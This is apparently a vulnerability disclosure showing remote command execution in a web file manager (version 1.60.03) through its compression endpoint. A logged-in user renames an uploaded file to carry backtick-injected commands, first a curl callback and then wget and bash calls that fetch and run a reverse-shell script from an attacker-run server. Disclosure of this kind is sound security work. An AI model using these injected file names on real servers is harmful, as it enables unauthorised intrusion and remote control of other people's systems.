**Remote Command Execution**

1.60.03 version （1.60.03 release on **linux**）
![](https://github.com/DReazer/CV3/blob/main/pngs/1.png)

Through the registration function, you can register a **normal account**

Enter your email address, the verification code you received, and the password you need to set. You can register a **normal account**

![](https://github.com/DReazer/CV3/blob/main/pngs/2.png)

After registration, you can log in with this registered normal account

![](https://github.com/DReazer/CV3/blob/main/pngs/3.png)

In "My Files", upload a file:

![](https://github.com/DReazer/CV3/blob/main/pngs/4.png)

Through the rename operation, the file is renamed to a name with attack vectors:

![](https://github.com/DReazer/CV3/blob/main/pngs/5.png)

set    1111 \`curl+ip\`  

![](https://github.com/DReazer/CV3/blob/main/pngs/6.png)

Then perform online compression

![](https://github.com/DReazer/CV3/blob/main/pngs/7.png)

After the compression is completed, it can be found that the attack server has received an http request message, indicating that there is a command execution vulnerability

![](https://github.com/DReazer/CV3/blob/main/pngs/8.png)

Here is the request  for the compression function

use:     **/?explorer/index/zip**  

(PS:  You cannot modify the malicious command directly in this request packet, it is invalid. You must first modify it to include the malicious command file name, and then compress it.)

![](https://github.com/DReazer/CV3/blob/main/pngs/9.png)

Next I will create a series of attack vectors，until my attack machine gains access to the server.

I created a simple flask server on my attack machine that can directly download bash.sh

![](https://github.com/DReazer/CV3/blob/main/pngs/10.png)

The bash.sh content is a reverse shell:

![](https://github.com/DReazer/CV3/blob/main/pngs/11.png)

Start this flask server on my attack machine

![](https://github.com/DReazer/CV3/blob/main/pngs/12.png)

Next rename the files in the following order and compress them one by one

![](https://github.com/DReazer/CV3/blob/main/pngs/13.png)

You can:

1.First change the file name to 1111\`wget -O bash.sh + ip\`, then compress it



2.Then change the file name to 1111\`bash bash.sh\` ,then compress it

![](https://github.com/DReazer/CV3/blob/main/pngs/14.png)

After completing the above series of operations，

Finally my attacking machine receive a reverse shell:

![](https://github.com/DReazer/CV3/blob/main/pngs/15.png)
